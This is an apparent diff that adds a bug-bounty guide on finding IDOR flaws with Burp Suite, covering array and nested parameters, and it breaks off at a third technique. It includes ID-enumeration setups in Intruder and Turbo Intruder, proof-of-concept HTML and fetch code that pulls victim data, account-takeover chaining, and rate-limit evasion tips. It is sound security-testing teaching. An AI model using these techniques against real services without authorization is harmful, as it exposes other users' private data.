@@ -14764,3 +14764,2431 @@ echo json_encode($data);
 
 ---
 
+# Complete Methodology for Bug #27: Array Parameters IDOR in Burp Suite
+
+## 🎯 **Bug #27: Array Parameters IDOR**
+**Technique:** `?id[]=100&id[]=101` - Testing array-style parameter handling
+
+---
+
+## 📋 **PREREQUISITES & SETUP**
+
+### **Required Tools**
+- Burp Suite Professional/Community
+- Browser with Burp CA certificate installed
+- FoxyProxy or similar for quick proxy switching
+
+### **Initial Configuration**
+1. **Burp Proxy Setup**
+   ```
+   Proxy → Intercept → Intercept is on
+   Proxy → Options → Add: 127.0.0.1:8080
+   ```
+
+2. **Scope Configuration**
+   ```
+   Target → Scope → Add target domain
+   Check "Use advanced scope control"
+   Include all subdomains and parameters
+   ```
+
+---
+
+## 🔍 **PHASE 1: RECONNAISSANCE & PARAMETER DISCOVERY**
+
+### **Step 1.1: Passive Discovery**
+1. **Browse application normally** while capturing traffic
+2. **Target Scope:**
+   ```
+   Right-click on request → Add to Scope
+   ```
+
+3. **Filter Traffic:**
+   ```
+   Proxy → HTTP History → Filter:
+   ✓ Show only in-scope items
+   ✓ Hide CSS/JS/Images
+   ```
+
+### **Step 1.2: Identify Potential Parameters**
+Look for patterns in requests:
+
+```
+GET /api/user/profile?id=100
+GET /api/posts/view?post_id=200
+POST /api/update-profile HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user_id=100&name=John
+```
+
+**Document these in Burp:**
+```
+Target → Site Map → Right-click → Add Note:
+[IDOR-Potential] Parameter: id (numeric), user_id, accountId
+```
+
+### **Step 1.3: Spider for Hidden Endpoints**
+```
+Target → Site Map → Right-click → Spider this host
+Check: "Spider all links recursively"
+```
+
+---
+
+## 🧪 **PHASE 2: BASELINE TESTING**
+
+### **Step 2.1: Create Test Accounts**
+Create 3 accounts for testing:
+```
+Account A (Attacker) - attacker@test.com
+Account B (Victim 1) - victim1@test.com  
+Account C (Victim 2) - victim2@test.com
+```
+
+### **Step 2.2: Capture Authenticated Requests**
+1. **Login as Account A**
+2. **Perform actions on your own resources**
+3. **Capture requests in Burp**
+
+Example captured request:
+```
+GET /api/documents/view?id=100 HTTP/1.1
+Host: target.com
+Cookie: session=ABC123
+```
+
+### **Step 2.3: Establish Baseline Behavior**
+Send to Repeater (Ctrl+R):
+```
+Right-click → Send to Repeater
+```
+
+Test with your own IDs:
+- `id=100` → 200 OK (your document)
+- `id=999999` → 403/404 (non-existent)
+- `id=0` → 403/404
+
+---
+
+## 🔬 **PHASE 3: ARRAY PARAMETER TESTING METHODOLOGY**
+
+### **Step 3.1: Convert Standard Parameter to Array**
+
+**Original Request:**
+```
+GET /api/documents/view?id=100 HTTP/1.1
+```
+
+**Test 1: Simple Array**
+```
+GET /api/documents/view?id[]=100 HTTP/1.1
+```
+*Check response behavior*
+
+**Test 2: Multiple Values**
+```
+GET /api/documents/view?id[]=100&id[]=101 HTTP/1.1
+```
+
+### **Step 3.2: Burp Repeater Testing Sequence**
+
+Create a testing sequence in Repeater:
+
+**Request 1: Control**
+```
+GET /api/documents/view?id=100
+```
+Response: 200 OK (your document)
+
+**Request 2: Empty Array**
+```
+GET /api/documents/view?id[]=
+```
+Response: Note behavior
+
+**Request 3: Single Array Element**
+```
+GET /api/documents/view?id[]=100
+```
+Response: 200 OK or different?
+
+**Request 4: Two Elements (One Yours, One Victim's)**
+```
+GET /api/documents/view?id[]=100&id[]=101
+```
+Response: Critical observation point!
+
+### **Step 3.3: Automated Testing with Burp Intruder**
+
+**Setup Intruder Attack:**
+```
+Right-click request → Send to Intruder
+Positions → Clear § → Add § around parameter
+```
+
+**Payload Positions:**
+```
+GET /api/documents/view?id[]=§100§&id[]=§101§ HTTP/1.1
+```
+
+**Payload Sets:**
+```
+Set 1: Your IDs [100, 100, 100, 100]
+Set 2: Victim IDs [101, 102, 103, 104]
+```
+
+**Payload Configuration:**
+```
+Payload type: Numbers
+Number range: 1-1000 (increment by 1)
+Number format: Decimal
+```
+
+### **Step 3.4: Burp Intruder Attack Types**
+
+**Attack Type 1: Sniper (Single Position)**
+```
+Position: id[]=§100§
+Payload: 101,102,103
+→ Tests: id[]=101, id[]=102, id[]=103
+```
+
+**Attack Type 2: Battering Ram**
+```
+Position1: id[]=§100§&id[]=§101§
+All positions get same payload
+→ Tests: id[]=101&id[]=101
+```
+
+**Attack Type 3: Pitchfork (Critical for Bug #27)**
+```
+Set 1: Your IDs [100,100,100]
+Set 2: Victim IDs [101,102,103]
+→ Tests: 
+  id[]=100&id[]=101
+  id[]=100&id[]=102  
+  id[]=100&id[]=103
+```
+
+**Attack Type 4: Cluster Bomb (Comprehensive)**
+```
+Set 1: Your IDs [100,100,100]
+Set 2: Victim IDs [101,102,103]
+→ All combinations:
+  id[]=100&id[]=101
+  id[]=100&id[]=102
+  id[]=100&id[]=103
+  id[]=100&id[]=101 (duplicate with next)
+```
+
+---
+
+## 📊 **PHASE 4: RESPONSE ANALYSIS**
+
+### **Step 4.1: Response Patterns to Identify**
+
+Create a comparison table:
+
+| Request Format | Expected (Auth) | Actual Response | Vulnerability |
+|----------------|-----------------|-----------------|---------------|
+| `id=100` | 200 | 200 | Baseline |
+| `id=101` | 403 | 403 | Good |
+| `id[]=100` | 200 | 200 | OK |
+| `id[]=101` | 403 | 403 | OK |
+| `id[]=100&id[]=101` | 403 | 200? | **VULN** |
+| `id[]=101&id[]=102` | 403 | 200? | **VULN** |
+
+### **Step 4.2: Burp Comparer for Response Analysis**
+
+1. **Select two responses** in HTTP History
+2. **Right-click → Send to Comparer**
+3. **Compare responses** word-by-word
+
+### **Step 4.3: Grep - Match in Intruder**
+
+Configure Intruder to highlight successes:
+```
+Options → Grep - Match
+Add: "Your Profile", "Welcome", "200 OK"
+Add: Response status codes
+```
+
+### **Step 4.4: Response Time Analysis**
+```
+Options → Grep - Extract
+Extract response times
+Look for anomalies when victim IDs included
+```
+
+---
+
+## 🎭 **PHASE 5: ADVANCED ARRAY MANIPULATIONS**
+
+### **Step 5.1: Different Array Syntax Testing**
+
+**PHP Style:**
+```
+GET /api/data?ids[]=100&ids[]=101
+```
+
+**JSON Array in POST:**
+```
+POST /api/data HTTP/1.1
+Content-Type: application/json
+
+{"ids": [100, 101]}
+```
+
+**Query String Array:**
+```
+GET /api/data?ids[0]=100&ids[1]=101
+```
+
+**Nested Arrays:**
+```
+GET /api/data?user[id][]=100&user[id][]=101
+```
+
+### **Step 5.2: Parameter Pollution Variations**
+
+**Duplicate Parameters (last wins):**
+```
+GET /api/data?id=100&id=101
+```
+
+**Duplicate with Array Mix:**
+```
+GET /api/data?id[]=100&id=101
+```
+
+**Mixed Types:**
+```
+GET /api/data?id[]=100&id[]=101&id=102
+```
+
+### **Step 5.3: Burp Sequencer for Array Testing**
+```
+Right-click request → Send to Sequencer
+Live capture → Analyze
+Check token randomness in array parameters
+```
+
+---
+
+## 🔧 **PHASE 6: AUTOMATED SCANNING**
+
+### **Step 6.1: Configure Burp Scanner for IDOR**
+```
+Target → Site Map → Right-click → Actively scan
+Scan Configuration:
+✓ Use custom configuration
+Insertion points → Check "Add to all parameters"
+Attack surface → Check "Parameters"
+```
+
+### **Step 6.2: Create Custom Scan Check**
+```
+Extender → Extensions → Add
+Load BApp Store → "IDOR Detector" or custom Python script
+```
+
+Example Python extension for array IDOR:
+```python
+from burp import IBurpExtender, IScannerCheck
+import re
+
+class BurpExtender(IBurpExtender, IScannerCheck):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Array IDOR Scanner")
+        callbacks.registerScannerCheck(self)
+        
+    def doPassiveScan(self, baseRequestResponse):
+        # Analyze for array parameters
+        analyzed = self._helpers.analyzeRequest(baseRequestResponse)
+        parameters = analyzed.getParameters()
+        
+        for param in parameters:
+            if param.getName().endswith('[]'):
+                # Flag for manual review
+                return [self._callbacks.applyMarkers(
+                    baseRequestResponse, None, None)]
+        return None
+```
+
+### **Step 6.3: Intruder Payload Processing**
+Create custom payload processor:
+```
+Intruder → Payloads → Payload Processing
+Add → "Invoke Burp Extension"
+Select custom processor for array permutations
+```
+
+---
+
+## 📝 **PHASE 7: EXPLOITATION & PROOF OF CONCEPT**
+
+### **Step 7.1: Validate the Vulnerability**
+
+**Test Chain:**
+1. Login as Account A
+2. Capture request with your ID=100
+3. Modify to include Victim ID=101
+4. Observe if Victim data is returned
+
+**Confirm by accessing exclusive Victim data:**
+```
+GET /api/private-messages?user_id[]=100&user_id[]=101
+```
+
+### **Step 7.2: Create Proof of Concept**
+
+**Simple PoC HTML:**
+```html
+<html>
+  <body>
+    <h1>Array IDOR PoC</h1>
+    <form action="https://target.com/api/documents/view" method="GET">
+      <input type="hidden" name="id[]" value="100">
+      <input type="hidden" name="id[]" value="101">
+      <input type="submit" value="View Victim Data">
+    </form>
+  </body>
+</html>
+```
+
+**JavaScript PoC:**
+```javascript
+fetch('https://target.com/api/documents/view?id[]=100&id[]=101', {
+  credentials: 'include'
+})
+.then(response => response.json())
+.then(data => console.log('Victim data:', data));
+```
+
+### **Step 7.3: Burp Macro for Exploitation**
+```
+Project options → Sessions → Macros → Add
+Record macro:
+1. Login as attacker
+2. Request with array parameters
+3. Extract victim data
+```
+
+---
+
+## 📊 **PHASE 8: DOCUMENTATION & REPORTING**
+
+### **Step 8.1: Burp Project Saving**
+```
+Project File → Save copy
+Include:
+- HTTP History
+- Scanner results
+- Intruder attacks
+- Repeater tabs
+```
+
+### **Step 8.2: Generate Report**
+```
+Target → Site Map → Right-click → Generate Report
+Include:
+- Issue details
+- Request/Response pairs
+- Remediation advice
+```
+
+### **Step 8.3: Report Template for Bug #27**
+
+```markdown
+# IDOR Vulnerability Report - Array Parameter Bypass
+
+## Vulnerability Type
+Insecure Direct Object Reference (IDOR) via Array Parameter Manipulation
+
+## Endpoint
+`GET /api/documents/view`
+
+## Parameters Affected
+- `id[]` (array parameter)
+
+## Description
+The application fails to properly validate authorization when multiple IDs are 
+provided in array format. While single ID requests are properly checked, 
+array requests bypass authorization controls.
+
+## Steps to Reproduce
+1. Login as attacker account (ID: 100)
+2. Navigate to: /api/documents/view?id[]=100&id[]=101
+3. Observe that documents from victim account (ID: 101) are returned
+4. Note that `id=101` (single) returns 403, but array returns 200
+
+## Proof of Concept Request
+```
+GET /api/documents/view?id[]=100&id[]=101 HTTP/1.1
+Host: target.com
+Cookie: session=ATTACKER_SESSION
+```
+
+## Impact
+- Unauthorized access to victim documents
+- Data breach potential
+- Privacy violation
+
+## Remediation
+- Validate authorization for ALL objects in array parameters
+- Implement proper access control checks per resource
+- Consider using indirect reference maps
+```
+
+---
+
+## 🛡️ **PHASE 9: ADVANCED BURP TECHNIQUES**
+
+### **Step 9.1: Turbo Intruder for Speed**
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False)
+    
+    # Test array combinations
+    for your_id in range(100, 110):
+        for victim_id in range(200, 210):
+            engine.queue(target.req, [
+                your_id,
+                victim_id
+            ])
+
+def handleResponse(req, interesting):
+    if '200 OK' in req.response:
+        table.add(req)
+```
+
+### **Step 9.2: Custom Scanner Checks**
+```
+Extender → Extensions → Add (Python)
+Create custom check for array IDOR patterns
+```
+
+### **Step 9.3: Session Handling Rules**
+```
+Project options → Sessions → Session handling rules → Add
+Rule type: Check session valid
+If invalid: Re-login and continue
+Apply to: All tools
+```
+
+---
+
+## ⚡ **PHASE 10: REAL-WORLD SCENARIOS**
+
+### **Scenario 1: Multi-tenant Applications**
+```
+GET /api/company/data?company_id[]=123&company_id[]=456
+```
+
+### **Scenario 2: Messaging Systems**
+```
+GET /api/messages?thread_id[]=1001&thread_id[]=1002
+```
+
+### **Scenario 3: E-commerce Orders**
+```
+GET /api/orders?order_id[]=ORD-100&order_id[]=ORD-101
+```
+
+### **Scenario 4: Healthcare Records**
+```
+GET /api/patient/records?patient_id[]=P100&patient_id[]=P200
+```
+
+---
+
+## 🔍 **TROUBLESHOOTING GUIDE**
+
+### **Issue: No Response Difference**
+- Try different array syntax
+- Test POST instead of GET
+- Check if application uses JSON
+
+### **Issue: Session Expires**
+- Create macro for auto-relogin
+- Use session handling rules
+- Reduce attack speed
+
+### **Issue: Rate Limiting**
+- Add delays in Intruder
+- Rotate IPs if possible
+- Use Turbo Intruder with throttling
+
+### **Issue: CSRF Tokens**
+- Extract tokens with macros
+- Use session handling to refresh
+- Parse responses for new tokens
+
+---
+
+## 📚 **RESOURCES & REFERENCES**
+
+### **Burp Extensions for IDOR**
+1. **Autorize** - Automate authorization tests
+2. **AuthMatrix** - Advanced authorization testing
+3. **Turbo Intruder** - High-speed attacks
+4. **Param Miner** - Discover hidden parameters
+5. **Backslash Powered Scanner** - Advanced scanning
+
+### **Useful Regex Patterns**
+```
+Find array parameters: \[\]
+Find numeric IDs: [0-9]{1,}
+Find UUIDs: [a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9-]{12}
+```
+
+### **Burp Shortcuts**
+```
+Ctrl+R - Send to Repeater
+Ctrl+I - Send to Intruder
+Ctrl+Shift+B - Send to Comparer
+Ctrl+Shift+X - Send to Sequencer
+```
+
+---
+
+## ⚠️ **SAFETY CHECKLIST**
+
+- [ ] Have explicit authorization
+- [ ] Test in isolated environment first
+- [ ] Don't modify production data
+- [ ] Respect rate limits
+- [ ] Document all findings
+- [ ] Don't access sensitive PII
+- [ ] Stop if you find critical data
+- [ ] Follow responsible disclosure
+- [ ] Clear Burp logs after testing
+- [ ] Remove test accounts after completion
+
+---
+
+## 🎯 **SUCCESS INDICATORS**
+
+You've found Bug #27 if:
+1. Single ID request is properly authorized
+2. Array request with victim ID returns data
+3. Response contains victim's private information
+4. No additional authentication bypassed
+5. Can reproduce with different accounts
+
+---
+
+# 🎯 **Bug #28: Nested Parameters IDOR - Complete Burp Suite Methodology**
+
+## 📋 **Bug Description**
+**Nested Parameters IDOR** occurs when applications use complex parameter structures like `user[id]=100` or `{"user":{"id":100}}` and fail to properly validate authorization when these nested parameters are manipulated.
+
+---
+
+## 🔍 **FULL BURP SUITE TESTING METHODOLOGY**
+
+### **PHASE 1: RECONNAISSANCE & MAPPING**
+
+#### **1.1 Spider/Crawl Configuration**
+```
+1. Open Burp Suite → Target → Site Map
+2. Right-click target → Spider → Check "Spider recursively"
+3. Configure Spider options:
+   - Threads: 5-10
+   - Check "Process forms"
+   - Check "Parse HTML forms"
+   - Check "Request with cookies"
+```
+
+#### **1.2 Passive Scanning Setup**
+```
+Burp → Target → Scope → Include in scope
+- Add target domains/IPs
+
+Burp → Scanner → Live Scanning
+- Enable "Use suite scope"
+- Check "Use advanced scan options"
+```
+
+#### **1.3 Parameter Discovery**
+**Using Burp Intruder for Parameter Fuzzing:**
+```
+1. Capture a request
+2. Send to Intruder (Ctrl+I)
+3. Positions tab → Clear §
+4. Add § around parameter values
+5. Payloads → Load wordlist with common parameter names:
+   
+   PARAMETER WORDLIST:
+   - id, user_id, account_id, profile_id
+   - user, account, profile
+   - data[id], data[user_id]
+   - user[id], account[id]
+   - json.id, json.user.id
+   - params.user.id
+   - nested[user][id]
+   - attributes[user_id]
+```
+
+---
+
+### **PHASE 2: IDENTIFYING NESTED PARAMETER PATTERNS**
+
+#### **2.1 Manual Pattern Recognition**
+
+**Check Different Request Formats:**
+
+**URL Encoded Form (application/x-www-form-urlencoded):**
+```
+POST /api/update-profile HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user[id]=100&user[name]=john&action=update
+```
+
+**JSON Format:**
+```
+POST /api/update-profile HTTP/1.1
+Content-Type: application/json
+
+{
+    "user": {
+        "id": 100,
+        "name": "john"
+    },
+    "action": "update"
+}
+```
+
+**XML Format:**
+```
+POST /api/update-profile HTTP/1.1
+Content-Type: application/xml
+
+<request>
+    <user>
+        <id>100</id>
+        <name>john</name>
+    </user>
+    <action>update</action>
+</request>
+```
+
+#### **2.2 Pattern Discovery Using Burp Proxy History**
+
+```
+1. Go to Proxy → HTTP History
+2. Filter by target scope
+3. Look for patterns in parameters:
+   - Click through requests
+   - Note parameter naming conventions
+   - Look for square brackets [] in parameters
+   - Look for nested JSON structures
+   - Look for XML nested elements
+4. Use Search function (Ctrl+F):
+   - Search for "[" and "]"
+   - Search for "{" to find JSON
+   - Search for "<" to find XML
+```
+
+---
+
+### **PHASE 3: SYSTEMATIC TESTING WITH BURP INTRUDER**
+
+#### **3.1 Basic Nested Parameter Manipulation**
+
+**Setup for URL-Encoded Forms:**
+```
+Request Template:
+POST /api/profile/update HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=abc123
+
+user[id]=§100§&user[name]=test&action=view
+
+Payload Configuration:
+1. Payload type: Numbers
+2. Range: 1-200 (step 1)
+3. Number format: Decimal
+```
+
+**Attack Types to Try:**
+
+**Sniper Attack (Single parameter):**
+```
+Positions: user[id]=§100§
+Payload: 1,2,3,4,5... (sequential IDs)
+```
+
+**Battering Ram Attack (Multiple same values):**
+```
+Positions: user[id]=§100§&profile[id]=§100§
+Payload: 101,102,103...
+```
+
+**Pitchfork Attack (Different ID sets):**
+```
+Positions: user[id]=§100§&profile[id]=§200§
+Payload Set 1: 101,102,103...
+Payload Set 2: 201,202,203...
+```
+
+#### **3.2 Advanced Nested Parameter Testing**
+
+**Test Different Naming Conventions:**
+```
+PAYLOAD POSITIONS:
+user[§id§]=§100§
+user[§user_id§]=§100§
+user[§account_id§]=§100§
+user[§profile_id§]=§100§
+```
+
+**Test Deep Nesting:**
+```
+data[user][profile][id]=§100§
+request[params][user][account_id]=§100§
+nested[level1][level2][level3][id]=§100§
+```
+
+**Test Array Syntax:**
+```
+user[id][]=§100§
+user[][id]=§100§
+ids[]=§100§
+```
+
+#### **3.3 JSON Nested Parameter Testing**
+
+**Step 1: Capture JSON Request**
+```
+POST /api/user/update HTTP/1.1
+Content-Type: application/json
+Cookie: session=abc123
+
+{
+    "user": {
+        "id": 100,
+        "profile": {
+            "id": 200
+        }
+    }
+}
+```
+
+**Step 2: Configure Intruder for JSON**
+```
+1. Send to Intruder
+2. Switch to JSON tab in request view
+3. Highlight "100" and add §
+4. Configure payload:
+   - Numbers 1-500
+   - Process in Burp's JSON parser
+```
+
+**JSON Manipulation Templates:**
+
+```json
+// Original
+{"user":{"id":100}}
+
+// Test variations:
+{"user":{"id":101}}
+{"user_id":101}
+{"data":{"user_id":101}}
+{"params":{"user":{"id":101}}}
+{"nested":[{"user":{"id":101}}]}
+{"users":[{"id":101}]}
+{"user":{"identifier":101}}  // Different key name
+```
+
+#### **3.4 XML Nested Parameter Testing**
+
+**XML Request Template:**
+```
+POST /api/user/update HTTP/1.1
+Content-Type: application/xml
+
+<request>
+    <user>
+        <id>§100§</id>
+        <profile>
+            <id>§200§</id>
+        </profile>
+    </user>
+</request>
+```
+
+**XML Payload Variations:**
+```xml
+<!-- Test different paths -->
+<user id="§100§"/>
+<user><identifier>§100§</identifier></user>
+<account><user_id>§100§</user_id></account>
+<data><attributes><user_id>§100§</user_id></attributes></data>
+```
+
+---
+
+### **PHASE 4: RESPONSE ANALYSIS TECHNIQUES**
+
+#### **4.1 Setting Up Response Analysis in Intruder**
+
+```
+1. Intruder → Options → Grep - Extract
+2. Add response extraction rules:
+   - Extract response code
+   - Extract content length
+   - Extract specific text patterns
+   - Extract error messages
+   
+3. Grep - Match patterns:
+   Add common indicators:
+   - "unauthorized"
+   - "forbidden"
+   - "access denied"
+   - "not found"
+   - "success"
+   - user's actual data (name, email)
+   - "profile updated"
+```
+
+#### **4.2 Advanced Analysis with Intruder**
+
+**Response Timing Analysis:**
+```
+1. Intruder → Options → Request Engine
+2. Set Number of threads: 1 (for accurate timing)
+3. Set Throttle between requests: 0
+4. Add to Intruder → Columns:
+   - Enable "Response received"
+   - Enable "Response completed"
+```
+
+**Content Length Analysis:**
+```python
+# Use Burp Extender or manual analysis
+- Response length 2000: Success (full data)
+- Response length 500: Error (access denied)
+- Response length 1500: Partial data (possible IDOR)
+```
+
+**Status Code Patterns:**
+- 200 OK → Potential IDOR if unauthorized data returned
+- 403 Forbidden → Properly blocked (continue testing variations)
+- 404 Not Found → Invalid ID (enumerate further)
+- 302 Redirect → Check redirect location for ID leaks
+- 500 Internal Error → Possible injection point
+
+#### **4.3 Using Comparer for Response Analysis**
+
+```
+1. Select two responses in Intruder results
+2. Right-click → Send to Comparer
+3. Use word-by-word comparison
+4. Look for:
+   - Different user data appearing
+   - Subtle differences in error messages
+   - Timing differences
+   - Header variations
+```
+
+---
+
+### **PHASE 5: AUTOMATED SCANNING TECHNIQUES**
+
+#### **5.1 Burp Scanner Active Scan Configuration**
+
+```
+1. Right-click request → Do an active scan
+2. Scan Configuration → Customize:
+   
+   Insertion Points:
+   - Check "All parameters"
+   - Check "Nested parameters"
+   - Check "JSON parameters"
+   - Check "XML parameters"
+   - Check "Multi-part parameters"
+   
+   Scan Types:
+   - Enable "All checks"
+   - Add custom IDOR checks
+```
+
+#### **5.2 Creating Custom Scan Checks**
+
+**Using Burp Extender API:**
+```java
+// Pseudocode for custom IDOR check
+public List<IScanIssue> doPassiveScan(IHttpRequestResponse requestResponse) {
+    // Extract nested parameters
+    // Test with different user IDs
+    // Compare responses
+    // Report if unauthorized access achieved
+}
+```
+
+#### **5.3 Intruder Payload Processing**
+
+**Create Custom Payload Processor:**
+```
+1. Intruder → Payloads → Payload Processing
+2. Add rule → Add prefix: "user[id]="
+3. Add rule → Add suffix: "&"
+4. Add rule → Encode: URL-encode key characters
+```
+
+**Use Recursive Grep:**
+```
+1. Intruder → Options → Grep - Extract
+2. Extract IDs from responses
+3. Use extracted IDs for follow-up attacks
+4. Chain multiple Intruder attacks
+```
+
+---
+
+### **PHASE 6: SPECIALIZED NESTED PARAMETER TECHNIQUES**
+
+#### **6.1 Parameter Pollution in Nested Structures**
+
+**Test Multiple Same Parameters:**
+```
+POST /api/update HTTP/1.1
+
+user[id]=100&user[id]=101&user[name]=test
+```
+
+**JSON Parameter Pollution:**
+```json
+{
+    "user": {
+        "id": 100,
+        "id": 101,
+        "name": "test"
+    }
+}
+```
+
+#### **6.2 Nested Parameter Injection**
+
+**Try Injecting New Nested Levels:**
+```
+Original: user[id]=100
+Modified: user[profile][admin_id]=100
+Modified: user[id]=100&admin[user_id]=100
+```
+
+**Test for Privilege Escalation:**
+```json
+{
+    "user": {
+        "id": 100,
+        "role": "user"
+    }
+}
+// Modify to:
+{
+    "user": {
+        "id": 101,
+        "role": "admin"
+    }
+}
+```
+
+#### **6.3 Cross-Parameter Relationships**
+
+**Test Relationships Between Nested Parameters:**
+```
+user[id]=100&profile[user_id]=100
+Modify one but not the other:
+user[id]=101&profile[user_id]=100
+user[id]=100&profile[user_id]=101
+```
+
+---
+
+### **PHASE 7: EXPLOITATION & VALIDATION**
+
+#### **7.1 Manual Verification Process**
+
+**Step-by-Step Validation:**
+```
+1. Create two test accounts (UserA, UserB)
+2. Log in as UserA
+3. Capture request with UserA's ID (100)
+4. Modify nested parameter to UserB's ID (101)
+5. Check if UserB's data is accessible
+6. Test write operations (update/delete)
+7. Document findings with screenshots
+```
+
+#### **7.2 Using Repeater for Precision Testing**
+
+```
+1. Send suspicious request to Repeater (Ctrl+R)
+2. Test variations manually:
+   
+   Variation 1: user[id]=101
+   Variation 2: data[user_id]=101  
+   Variation 3: {"user":{"id":101}}
+   Variation 4: <user><id>101</id></user>
+   
+3. Compare responses side-by-side
+4. Test different HTTP methods:
+   GET, POST, PUT, DELETE, PATCH
+```
+
+#### **7.3 Chain Multiple IDORs**
+
+**Example Chain:**
+```
+1. First IDOR: Find user IDs via profile.php?user[id]=101
+2. Extract email from response
+3. Second IDOR: Use email in password reset
+4. Third IDOR: Access reset token
+5. Account takeover achieved
+```
+
+---
+
+### **PHASE 8: ADVANCED BURP CONFIGURATIONS**
+
+#### **8.1 Custom Session Handling**
+
+```
+1. Project options → Sessions
+2. Add Session Handling Rules:
+   
+   Rule 1: Check session validity
+   - If 401/403, re-authenticate
+   
+   Rule 2: Macro for login
+   - Record login sequence
+   - Replay when session expires
+   
+   Rule 3: CSRF token handling
+   - Extract from responses
+   - Add to requests
+```
+
+#### **8.2 Intruder Resource Pool Configuration**
+
+```
+1. Intruder → Resource Pool
+2. Create new pool:
+   - Maximum concurrent requests: 10
+   - Delay between requests: 100ms
+   - Retry on network failure: Yes
+   - Follow redirects: Always
+```
+
+#### **8.3 Extensions for IDOR Testing**
+
+**Recommended Bypass Extensions:**
+```
+1. Authz - Test authorization by copying requests
+2. Autorize - Automatic authorization testing
+3. Backslash Powered Scanner - Advanced scanning
+4. JSON Web Tokens - JWT manipulation
+5. Param Miner - Discover hidden parameters
+6. Reflection - Detect reflected parameters
+```
+
+---
+
+### **PHASE 9: REAL-WORLD TESTING SCENARIOS**
+
+#### **9.1 E-commerce Platform Testing**
+
+**Nested Parameter Examples:**
+```
+Cart operations:
+POST /api/cart/update
+{
+    "cart": {
+        "items": [
+            {
+                "product_id": 123,
+                "user_id": 100  // <-- Test this
+            }
+        ]
+    }
+}
+
+Order history:
+GET /api/orders?user[id]=100&filter=past  // <-- Test nested user id
+```
+
+#### **9.2 Social Media Application**
+
+**Profile interactions:**
+```
+View profile:
+GET /api/profile?data[user][id]=100  // <-- Test nested parameter
+
+Post comment:
+POST /api/post/comment
+{
+    "post": {
+        "id": 500,
+        "comment": "test",
+        "author": {
+            "id": 100  // <-- Can you change to 101?
+        }
+    }
+}
+```
+
+#### **9.3 Banking/Financial Application**
+
+**Transaction testing:**
+```
+View transaction:
+GET /api/transactions?filter[account_id]=100  // <-- Test
+
+Transfer money:
+POST /api/transfer
+{
+    "from_account": {
+        "id": 100  // <-- Can you change?
+    },
+    "to_account": {
+        "id": 200  // <-- Can you change?
+    },
+    "amount": 1000
+}
+```
+
+---
+
+### **PHASE 10: REPORTING & DOCUMENTATION**
+
+#### **10.1 Using Burp's Reporting Features**
+
+```
+1. Select findings in Target/Site Map
+2. Right-click → Save selected items
+3. Generate HTML report:
+   - Include request/response pairs
+   - Add custom annotations
+   - Highlight nested parameters
+```
+
+#### **10.2 Documenting Each Finding**
+
+**Finding Template:**
+```
+VULNERABILITY: IDOR in Nested Parameter [user][id]
+ENDPOINT: POST /api/profile/update
+PARAMETER: user[id] (nested in JSON)
+
+PROOF:
+1. Original request (UserA): {"user":{"id":100}} → returns UserA's data
+2. Modified request: {"user":{"id":101}} → returns UserB's data
+3. Both users have different sessions
+
+IMPACT: Unauthorized access to any user's profile data
+
+REMEDIATION: Validate user permissions server-side using session tokens, not client-supplied IDs
+
+REPRODUCTION STEPS:
+1. Log in as user1
+2. Capture POST /api/profile/update
+3. Change nested user.id parameter to user2's ID
+4. Observe unauthorized access
+```
+
+#### **10.3 Screenshot Documentation in Burp**
+
+```
+1. Right-click request → Send to Comparer
+2. Select both requests → Right-click → Request in browser
+3. Take screenshots showing:
+   - Before modification (authorized)
+   - After modification (unauthorized)
+   - Differences in response data
+```
+
+---
+
+## 🛠️ **BURP SUITE SHORTCUTS FOR IDOR TESTING**
+
+| Shortcut | Function | Use Case |
+|----------|----------|----------|
+| `Ctrl+R` | Send to Repeater | Manual nested parameter testing |
+| `Ctrl+I` | Send to Intruder | Automated ID enumeration |
+| `Ctrl+Shift+B` | Send to Comparer | Compare response differences |
+| `Ctrl+F` | Search | Find nested parameter patterns |
+| `Ctrl+Shift+F` | Filter settings | Focus on specific requests |
+| `Ctrl+Shift+L` | Load/Unload extensions | Add IDOR testing tools |
+| `Ctrl+Shift+S` | Save request | Document findings |
+| `Ctrl+Shift+P` | Project options | Configure session handling |
+
+---
+
+## 📊 **SUCCESS INDICATORS CHECKLIST**
+
+- [ ] Found nested parameter pattern (JSON/XML/form)
+- [ ] Successfully manipulated nested ID
+- [ ] Received different user's data
+- [ ] Verified with two different accounts
+- [ ] Tested both read and write operations
+- [ ] Documented request/response pairs
+- [ ] Confirmed vulnerability in real scenario
+- [ ] Checked for business logic impact
+- [ ] Verified no rate limiting/restrictions
+- [ ] Tested with authenticated/unauthenticated
+
+---
+
+## ⚠️ **TROUBLESHOOTING COMMON ISSUES**
+
+**Issue 1: Requests failing after parameter change**
+```
+Solution: Check for:
+- CSRF tokens (need to update)
+- Session binding (ID tied to session)
+- Request signing (HMAC validation)
+- Rate limiting (slow down attacks)
+```
+
+**Issue 2: All responses return 403**
+```
+Solution: Try:
+- Different parameter locations
+- Different HTTP methods
+- Different content types
+- Authenticated vs unauthenticated
+```
+
+**Issue 3: Can't find nested parameters**
+```
+Solution: Use Param Miner extension:
+1. Install Param Miner
+2. Right-click request → Extensions → Param Miner
+3. Select "Guess params" or "Scan for params"
+```
+
+---
+
+## 🎯 **KEY SUCCESS METRICS**
+
+- **Coverage:** Tested all identified nested parameters
+- **Depth:** Tested multiple nesting levels
+- **Breadth:** Tested different content types
+- **Verification:** Manual confirmation of automated findings
+- **Impact:** Real user data accessible
+- **Chaining:** Potential for account takeover
+
+---
+
+## 📚 **FINAL NOTES**
+
+- Always work within scope and authorization
+- Document everything meticulously
+- Stop testing if you encounter sensitive data
+- Report findings responsibly
+- Validate each finding manually
+- Consider business impact in your assessment
+
+# Complete Methodology for Bug #29: Parameter Prefix/Suffix IDOR
+
+## **Bug #29 Overview**
+**Parameter Prefix/Suffix IDOR** - Testing variations of parameter names by adding prefixes or suffixes to identify hidden or alternative parameters that might be vulnerable to IDOR.
+
+---
+
+## 📋 **PREREQUISITES**
+
+### **Tools Needed in Burp Suite**
+- Burp Suite Professional/Community
+- Extensions: 
+  - Param Miner
+  - Logger++
+  - Turbo Intruder
+  - Copy As Python-Requests
+  - Hackvertor
+
+### **Target Identification**
